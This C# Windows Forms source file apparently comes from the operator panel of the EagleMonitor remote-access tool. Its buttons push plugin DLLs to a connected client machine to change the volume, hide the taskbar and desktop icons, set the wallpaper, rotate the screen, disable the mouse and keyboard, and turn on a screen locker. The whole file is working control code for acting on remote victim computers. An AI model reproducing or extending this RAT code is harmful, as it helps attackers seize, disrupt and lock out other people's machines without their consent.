using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

namespace EagleMonitor.Forms
{
    public partial class MiscellaneousForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }

        internal MiscellaneousForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }

        private void increaseVolGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_UP);
            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(miscellaneousPacket);
        }

        private void decreaseVolGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_DOWN);
            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(miscellaneousPacket);
        }

        private void hideTaskBarGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_TASKBAR);
            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(miscellaneousPacket);
        }

        private void showTaskBarGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_TASKBAR);
            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(miscellaneousPacket);
        }

        private void wallpaperGuna2Button_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog()) 
            {
                if (ofd.ShowDialog() == DialogResult.OK) 
                {
                    string ext = new FileInfo(ofd.FileName).Extension;
                    WallPaperPacket wallPaperPacket = new WallPaperPacket(Compressor.QuickLZ.Compress(File.ReadAllBytes(ofd.FileName), 1), ext);
                    wallPaperPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
                    clientHandler.SendPacket(wallPaperPacket);
                }
            }
        }

        private void mouseGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (mouseGuna2ToggleSwitch.Checked)
            {
                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_OFF);
                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Hardware.dll"), 1);
                clientHandler.SendPacket(miscellaneousPacket);
            }
            else 
            {
                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_MS_ON);
                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Hardware.dll"), 1);
                clientHandler.SendPacket(miscellaneousPacket);
            }
        }

        private void keyboardGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (keyboardGuna2ToggleSwitch.Checked)
            {
                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_OFF);
                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Hardware.dll"), 1);
                clientHandler.SendPacket(miscellaneousPacket);
            }
            else
            {
                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.HDW_KB_ON);
                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Hardware.dll"), 1);
                clientHandler.SendPacket(miscellaneousPacket);
            }
        }

        private void screenLockerGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (screenLockerGuna2ToggleSwitch.Checked)
            {
                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_ON);
                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ScreenLocker.dll"), 1);
                clientHandler.SendPacket(miscellaneousPacket);
            }
            else 
            {
                MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SCREENLOCKER_OFF);
                miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ScreenLocker.dll"), 1);
                clientHandler.SendPacket(miscellaneousPacket);
            }
        }

        private void showDesktopIconsGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_SHOW_DESKTOP_ICONS);
            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(miscellaneousPacket);
        }

        private void hideDesktopIconsGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_DESKTOP_ICONS);
            miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(miscellaneousPacket);
        }

        private void rotateScreenGuna2Button_Click(object sender, EventArgs e)
        {
            ScreenRotationPacket screenRotationPacket = new ScreenRotationPacket(degreesGuna2ComboBox.Text);
            screenRotationPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
            clientHandler.SendPacket(screenRotationPacket);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label9_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
